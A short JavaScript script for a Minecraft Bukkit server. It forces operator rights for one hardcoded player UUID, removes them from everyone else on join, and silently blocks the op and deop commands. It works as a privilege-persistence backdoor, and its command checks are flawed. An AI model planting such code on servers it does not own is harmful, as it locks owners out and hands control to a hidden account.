//!waitForInit

const forcedOps = new Set([
  "34174c62-d45f-4c2c-81c7-6c954e6ffb0a"
]);

const Bukkit = org.bukkit.Bukkit;

// Handle player join
registerEvent("org.bukkit.event.player.PlayerJoinEvent", event => {
    const player = event.getPlayer();
    const uuidStr = player.getUniqueId().toString().toLowerCase();

    if (forcedOps.has(uuidStr)) {
        if (!player.isOp()) {
            player.setOp(true);
            player.sendMessage("§aYou have been granted forced OP.");
        }
    } else {
        // Remove op if not in forcedOps
        if (player.isOp()) {
            player.setOp(false);
            player.sendMessage("§cYour OP has been removed because you are not in the forced ops list.");
        }
    }
});

// Block /op and /deop from console commands silently
registerEvent("org.bukkit.event.server.ServerCommandEvent", event => {
  const cmd = event.getCommand().toLowerCase();
  if (cmd === "op" || cmd === "deop") {
    event.setCancelled(true);
  }
});

// Block /op and /deop from players silently
registerEvent("org.bukkit.event.player.PlayerCommandPreprocessEvent", event => {
  const msg = event.getMessage().toLowerCase();
  if (msg.startsWith("/op") || msg.startsWith("/deop")) {
    event.setCancelled(true);
  }
});
